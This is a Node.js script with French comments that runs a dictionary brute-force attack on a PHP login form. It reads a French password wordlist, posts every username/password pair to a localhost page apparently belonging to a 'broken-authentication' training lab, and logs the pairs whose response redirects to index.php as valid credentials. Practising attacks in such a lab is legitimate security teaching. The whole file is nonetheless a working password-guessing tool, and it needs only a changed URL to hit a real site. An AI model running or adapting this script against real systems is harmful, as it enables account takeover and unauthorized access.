// Axios est une librairie Node.js permettant de faire des requêtes HTTP
const axios = require('axios').default
const program = require('commander')
const readline = require('readline')
const fs = require('fs')

// Fonction permettant d'écrire une ligne dans le fichier logs
const log = (str = '') => {
    fs.appendFileSync(__dirname + '/logs', str + '\n', { encoding: 'utf-8' })
}

program.option('-u, --username <username>', "Nom de l'utilisateur")
program.parse(process.argv)

if (program.username) {
    const { username } = program

    const fileStream = fs.createReadStream(__dirname + '/../french_passwords.txt')

    const rl = readline.createInterface({
        input: fileStream,
        crlfDelay: Infinity,
    })

    ;(async () => {
        // Pour chaque mot de passe
        for await (const password of rl) {
            // Une requête POST est envoyée vers le formulaire de connexion
            // Le type de contenu (pour les forumaires PHP) est application/x-www-form-urlencoded
            axios({
                method: 'POST',
                url: 'http://localhost:80/02-broken-authentication/connexion.php',
                data: `username=${username}&password=${password}`,
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                maxRedirects: 0,
            })
                .then((value) => {
                    const { status } = value
                    // Si la page renvoie 200, aucune redirection n'a été renvoyée par PHP, la connexion n'a donc pas abouti
                    if (status === 200) {
                        log(`${Date.now()} >>		 Mauvaises informations de connexion ${username} -> ${password}`)
                    }
                })
                .catch((e) => {
                    const { response } = e
                    // S'il y a une redirection par header dans le code PHP
                    if (response.status === 302) {
                        const { headers } = response
                        // Si la redirection est vers index.php
                        if (headers.location === 'index.php') {
                            log(`${Date.now()} >> Couple valide ${username} -> ${password}`)
                            console.log(password)
                            // Requête GET vers le header 'location'
                            // axios({
                            //     method: 'GET',
                            //     url: 'http://localhost:80/2-broken-authentication/index.php',
                            //     headers: {
                            //         Cookie: headers['set-cookie'][0],
                            //     },
                            // }).then((index) => {
                            //     console.log(index.data)
                            // })
                        }
                    }
                })
        }
    })()
} else {
    console.log("Vous devez spécifier un nom d'utilisateur")
}